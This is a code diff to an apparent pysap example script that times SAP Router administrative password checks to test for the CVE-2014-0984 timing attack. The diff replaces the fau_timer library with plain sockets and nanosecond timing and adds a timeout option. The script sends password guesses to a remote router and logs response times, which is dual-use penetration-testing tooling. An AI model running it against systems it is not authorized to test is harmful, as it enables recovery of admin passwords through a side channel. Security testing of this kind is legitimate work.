@@ -18,21 +18,17 @@
 #
 
 # Standard imports
+import time
+import socket
 import logging
 from argparse import ArgumentParser
 # External imports
 from scapy.config import conf
-from scapy.packet import bind_layers
+from scapy.packet import bind_layers, raw
 # Custom imports
 import pysap
 from pysap.SAPNI import SAPNI, SAPNIStreamSocket
 from pysap.SAPRouter import SAPRouter, get_router_version
-
-# Try to import fau-timer for failing gracefully if not found
-try:
-    import fau_timer
-except ImportError:
-    fau_timer = None
 
 
 # Bind the SAPRouter layer
@@ -50,8 +46,7 @@ def parse_options():
                   "Further analysis of the time records could be performed in order to identify whether the server " \
                   "is vulnerable to a timing attack on the password check (CVE-2014-0984). More details about the  " \
                   "vulnerability in https://www.coresecurity.com/advisories/sap-router-password-timing-attack.  " \
-                  "The script make use of the fau_timer library for measuring the timing of server's responses. " \
-                  "Install the library from https://github.com/seecurity/mona-timing-lib."
+                  "Timing is measured using Python's perf_counter_ns()."
 
     usage = "%(prog)s [options] -d <remote host>"
 
@@ -73,6 +68,8 @@ def parse_options():
                       help="Correct password to test [%(default)s]")
     misc.add_argument("-o", "--output", dest="output", default="output.csv",
                       help="Output file [%(default)s]")
+    misc.add_argument("--timeout", dest="timeout", type=float, default=5.0,
+                      help="Socket timeout in seconds [%(default).1f]")
 
     options = parser.parse_args()
 
@@ -86,23 +83,26 @@ def try_password(options, password, output=None, k=0):
 
     p = SAPRouter(type=SAPRouter.SAPROUTER_ADMIN, version=options.router_version)
     p.adm_command = 2
-    p.adm_password = password
-    p = str(SAPNI() / p)
+    p.adm_password = password.encode()
+    data = raw(SAPNI() / p)
 
-    fau_timer.init()
-    fau_timer.send_request(options.remote_host, options.remote_port, p, len(p))
-    fau_timer.calculate_time()
-    cpu_peed = fau_timer.get_speed()
-    cpu_ticks = fau_timer.get_cpu_ticks()
-    time = fau_timer.get_time()
+    try:
+        with socket.create_connection((options.remote_host, options.remote_port),
+                                      timeout=options.timeout) as conn:
+            t_start = time.perf_counter_ns()
+            conn.sendall(data)
+            conn.recv(1024)
+            elapsed_ns = time.perf_counter_ns() - t_start
+    except (socket.timeout, OSError) as e:
+        elapsed_ns = "ERROR:%s" % e.__class__.__name__
+        logging.debug("Request failed: %s", e)
+    else:
+        logging.debug("Request time: %s nanosec" % elapsed_ns)
 
-    logging.debug("Request time: CPU Speed: %s Hz CPU Ticks: %s Time: %s nanosec" % (cpu_peed, cpu_ticks, time))
-
-    # Write the time to the output file
     if output:
-        output.write("%i,%s,%s\n" % (k, password, time))
+        output.write("%i,%s,%s\n" % (k, password, elapsed_ns))
 
-    return time
+    return elapsed_ns
 
 
 # Main function
@@ -114,10 +114,6 @@ def main():
         level = logging.DEBUG
     logging.basicConfig(level=level, format='%(message)s')
 
-    if fau_timer is None:
-        logging.error("[-] Required library not found. Please install it from https://github.com/seecurity/mona-timing-lib")
-        return
-
     # Initiate the connection
     conn = SAPNIStreamSocket.get_nisocket(options.remote_host, options.remote_port)
     logging.info("[*] Connected to the SAP Router %s:%d" % (options.remote_host, options.remote_port))
@@ -125,6 +121,7 @@ def main():
     # Retrieve the router version used by the server if not specified
     if options.router_version is None:
         options.router_version = get_router_version(conn)
+        conn.close()
 
     logging.info("[*] Using SAP Router version %d" % options.router_version)
 
